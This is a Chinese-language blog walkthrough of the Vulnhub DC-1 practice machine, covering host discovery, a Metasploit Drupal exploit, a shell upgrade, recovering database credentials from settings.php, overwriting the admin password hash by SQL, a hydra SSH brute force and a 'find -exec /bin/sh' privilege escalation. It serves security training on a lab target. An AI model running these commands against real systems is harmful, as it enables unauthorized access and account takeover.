\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/iaBfOS2oMS-rxPl1Qa7xqg)

说明：Vulnhub 是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。DC-1 为基础入门篇，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

下载地址：

https://www.vulnhub.com/entry/dc-1-1,292/

目标机 IP 地址：192.168.5.137  
攻击机 kali IP 地址：192.168.5.135

**arp-scan 是一个用来进行系统发现的 ARP 命令扫描工具。**  

命令 arp-scan  -l

发现目标 ip 为：192.168.5.137

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9C9MkIJ5qSADZOzof5YLgpFvrwsicuzsFBv42ZNgesA3Br22d3WeQE8w/640?wx_fmt=png)

**使用 nmap 进行端口查看**  

nmap -sS -Pn  192.168.5.137  --min-rate 1000 -p1-65535  --open

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9S9mq4CLv2EsJdic9LxZDsMic3CsGZiaPslFthRquvicTb6h89W6coiaSRkQ/640?wx_fmt=png)

\*flag1

访问 80 端口发现是 Drupal 所搭建的站点。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxAMy4zibxiaXtGiaugM6EIojU1euVcQAmdAiaxjj11uhxicRB8Ub6FdB7Uq4g/640?wx_fmt=png)

msf 查找该 cms 有哪些可利用的漏洞 (一个一个实验)  

如图：

msfconsole   

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9DibFOATpvcRxbrdxNFiaubuJ6q3fJ7RL2kia4dREZg11NXe5SCUYicuEWQ/640?wx_fmt=png)

攻击成功执行命令，发现 flag1.txt。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9SrrOnfby2QpibrgMuvU66pvdxDf7WgeFODaO7W0RXC0OwDqibAEfF0XQ/640?wx_fmt=png)

\*flag2

python-> 转换交互式 shell

python -c 'import pty;pty.spawn("/bin/bash")'

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G94XgApuVqicKahjAMkfia36EtkIUF1EudkUHicofGaSoMM8odOtVIaqeKg/640?wx_fmt=png)

**drupal 数据库配置文件**  /sites/default/settings.php

找到 flag2 并得知是 mysql 的数据库以及用户名密码。dbuser/R0ck3t

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9GFyLQN5UyhDbks0T9nqnZ7r2hYibicJfwUsdrvpcceQ3UtByXkOoSZYQ/640?wx_fmt=png)

\*flag3

链接 mysql 通过 flag2 获取的数据库配置信息

进入数据库查看数据

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9ejFr2cCezibulC2raOSFV7WRF5okwiaKgFhhRLIp9MbfTsmhPmpaMtcg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9V6JNz4o1opfn4RQTcMxYt73R8gicjqKvgqIPcYAToACicOoU3R7mYiaWg/640?wx_fmt=png)

查看表发现 users 表，查看该表字段返现用户名密码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9J7Sf5Hias9cBFtaNCu25m1uwtkXv2dibFh2B7C4jOI1xmdwLMXweiahbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxAlJicuxUXgicuZZgibewkewGgSXXXRuuICicsIHeCInPMy7wvVcLDpYjQbg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxAiakibgibqibe6STGxjPecicB4EwzOUAPktVH0M2kWuiaTSzfAxO13tNBpic7g/640?wx_fmt=jpeg)

无法解密，那我们就将密码改掉，收集资料得知，Drupal 对用户密码的加密是通过特定的加密文件进行加密的，加密文件位置在网站根目录下的 scripts 下。

使用加密脚本加密新密码 123456，生成加密密文。

详细信息：

https://www.drupal.org/node/1023428/ 

通过官方描述，对密码进行修改

password: 123456                

hash: $S$D7lXBdKAW230VzfapF/GsJg98zV8z7T3GNlR45nZtR1uCcYh11fn

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxAGeiaN0icY6DYjia2Gcb02YBmOJMEJ31EpiaIyFwNoMUZE97sMGHaXiaicRrw/640?wx_fmt=jpeg)

对 admin 用户进行密码修改

update users set pass ='$S$D7lXBdKAW230VzfapF/GsJg98zV8z7T3GNlR45nZtR1uCcYh11fn' where name = 'admin';

已更改成功

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxAVcFZdVFVsYZ8DoHwlDZsBia8mv60CAww01RW9wQ7Uj40VibI1QOQ0GMA/640?wx_fmt=jpeg)

登陆后台成功，发现 flag3。  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxASKhgUp4MIjibZKHg2zupgDW3r4XhmPVyw3aUU9JGk5GTqXyAQicYZ76Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zg4ibGYrEa26WU79ukNNInNFvKD5BkmxAmprHFMV2E2FyBgn3UbNJXphtfk0Cnc5F7Yjiapkq5KL9O1TMIicytQGQ/640?wx_fmt=jpeg)

\*flag4

由 flag3 提示信息 我们要查看一下 / etc/passwd  以及 /etc/shadow

由于权限的问题无法查看 shadow，查看 passwd 文件，发现 flag4 用户, 怀疑可以连接 ssh，对其进行 ssh 爆破。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G92BL45wRHqGtH6Y3wbEMV0neUiaNXqoKPajPElycicJKHeica9YFwVQnoA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9x9tLHRXr5dRrkHggeQbxWB5nBiaYQdcBAul5ugxuKtmRJgH4mae25Ew/640?wx_fmt=png)

使用 john+hydra

john 系统自带密码路径

自带字典 :/usr/share/john/password.lst

爆破命令:

hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.5.137

flag4/orange

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9KWXNk8XAuVmssKQ68QVLibiaz4IT1005yqg9cHJEUvHZqn1hm0STvvYA/640?wx_fmt=png)

ssh 链接

ssh flag4@192.168.5.137

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9XR0CQbqzmyQmgtv3PrxibU8FTCyYAWKFjKDMfpl6kiaB8cLa0ibBxklrQ/640?wx_fmt=png)

进行提权获取 root 权限  

find ./ gem -exec '/bin/sh' \\;  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa24BvNcvIBhyg95tlHLwW4G9I3JCkc5XjiamEn79BIj0I67Cs0UTnRSQm9SsPQtsUaKicMfbXLCp5RnA/640?wx_fmt=png)

参考链接：https://www.freesion.com/article/7353791580/

                 https://www.cnblogs.com/lxfweb/p/13364770.html

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq\_37602797/category\_10169006.html

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)